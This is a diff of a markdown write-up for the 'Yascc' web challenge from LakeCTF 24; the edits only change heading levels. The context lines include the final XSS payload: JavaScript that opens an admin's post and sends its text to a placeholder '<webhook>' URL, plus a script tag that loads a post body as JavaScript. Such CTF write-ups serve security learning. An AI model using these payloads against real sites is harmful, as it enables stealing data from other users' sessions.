@@ -6,7 +6,8 @@ description: "Writeup of Yascc web challenge from Lakectf 24"
 read: 10
 image: /images/lakectf.png
 ---
-#### **Author:** Manaf
+
+### **Author:** Manaf
 
 The Given Challenge was a Usual Admin bot based challenge where the main idea is to get xss somehow and exfiltrate something from the admin.
 
@@ -146,14 +147,14 @@ ${
 
 ### Final Payload
 
-Post1
+#### Post1
 ```javascript
 // post 1
 let w = window.open("/posts/1")
 setTimeout(()=>{window.location = "<webhook>?flag="+encodeURI(w.document.body.innerText.slice(350))},2000)
 ```
 
-Post2
+#### Post2
 ```javascript
 <script src="/api/posts/<id>/body?contentType=text/javascript"></script>
 ```
